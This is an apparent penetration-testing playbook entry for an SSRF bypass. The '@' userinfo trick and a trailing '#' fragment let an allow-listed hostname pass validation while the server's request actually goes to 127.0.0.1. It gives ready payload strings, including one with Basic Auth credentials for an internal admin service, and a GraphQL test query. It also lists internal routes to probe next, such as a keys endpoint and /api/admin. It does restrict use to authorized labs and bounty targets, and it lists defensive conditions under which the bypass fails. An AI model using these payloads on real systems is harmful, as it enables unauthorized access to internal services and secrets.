# Userinfo Fragment Loopback Bypass

## Context

Use this pattern only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

This applies when an application accepts a user-controlled upstream service, hostname, or URL and then appends a fixed path before making a server-side HTTP request.

## Payload Shape

```text
allowed.example@127.0.0.1:8001#
```

With a controlled internal path:

```text
allowed.example@127.0.0.1:8001/openapi.json#
```

With Basic Auth userinfo and an internal admin service:

```text
allowed.example@username:redacted-token@127.0.0.1:8003#
```

## Requirements

- The application accepts `@` in the service or URL field.
- Validation is confused by or naively matches `allowed.example`.
- The HTTP client treats the text before the final `@` as userinfo.
- The real host becomes `127.0.0.1` or another internal address.
- The application appends a path after the controlled value.
- The fragment marker keeps the appended path from changing the effective internal path.
- The response or error gives an observable signal.

## Why It Worked

The payload separates validator interpretation from executor interpretation:

```text
validator-visible string: allowed.example
executor host: 127.0.0.1
```

The fragment marker can neutralize an appended suffix:

```text
controlled: allowed.example@127.0.0.1:8001/openapi.json#
appended:   /api/files/
effective:  http://allowed.example@127.0.0.1:8001/openapi.json#/api/files/
```

The HTTP request path remains:

```text
/openapi.json
```

## Why It Fails

- The validator parses the URL and checks the normalized hostname.
- The app rejects userinfo, fragments, or multiple `@` characters.
- The server treats the input as a hostname only and escapes special characters.
- The HTTP client rejects malformed authority syntax.
- The network layer blocks loopback or private IP destinations.
- The response body is not returned, making the SSRF blind.
- The fixed appended path is applied after parsing in a way the fragment cannot affect.

## Minimal Test

Start with an internal endpoint that produces a harmless, recognizable body:

```graphql
query MyQuery {
  file(id: "", service: "allowed.example@127.0.0.1:8001#") {
    id
  }
}
```

Expected useful signals:

```text
OpenAPI
404 from internal service
service banner
different status/body than an external request
```

## Follow-Up

If OpenAPI or service documentation is exposed, prefer documented internal routes over guessing:

```text
/openapi.json
/_internal/status
/_sentinel/keys.json
/api/admin
```

Do not store live tokens, flags, cookies, or private URLs in reusable payload files.
